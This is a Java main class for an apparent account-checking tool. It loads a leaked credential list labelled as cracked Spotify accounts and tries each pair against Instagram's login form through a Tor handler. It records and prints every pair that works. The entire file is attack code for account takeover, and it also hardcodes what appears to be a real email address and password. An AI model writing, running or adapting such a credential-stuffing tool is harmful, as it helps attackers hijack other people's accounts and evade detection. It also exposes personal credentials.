import Network.Handler;
import Network.TorHandler;
import Objects.LoginData;
import Objects.LoginDom;

import java.io.File;
import java.io.IOException;


public class Main {
    public static void main(String[] args) throws IOException {
        LoginData loginData = new LoginData("freizeittsix03@gmail.com", "pozhov63");
        Handler handler = new TorHandler();
        File myObj = new File("E:\\NextSync\\Aufträge\\test.txt");
        LoginList list = FileHandler.readFile("E:\\NextSync\\Aufträge\\CrackedSpotifyACC");
        list.list.set(0, loginData);
        LoginDom dom = new LoginDom("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[1]/div/label/input", "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[2]/div/label/input", "/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div/div[3]/button", "/html/body/div[2]/div/div/div/div[2]/button[1]", "https://www.instagram.com/","/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[2]");
        try {
            for (int i = 0; i < list.list.size(); i++) {
                if (handler.getResponse(list.list.get(i), dom)) {
                    FileHandler.addAcc(myObj, list.list.get(i));
                    System.out.println("Username: " + list.list.get(i).username + "  Password: " + list.list.get(i).password);
                    System.out.println("Status: [SUCCESS]");
                } else {
                    System.out.println("Username: " + list.list.get(i).username + "  Password: " + list.list.get(i).password);
                    System.out.println("Status: [FAILED]");
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
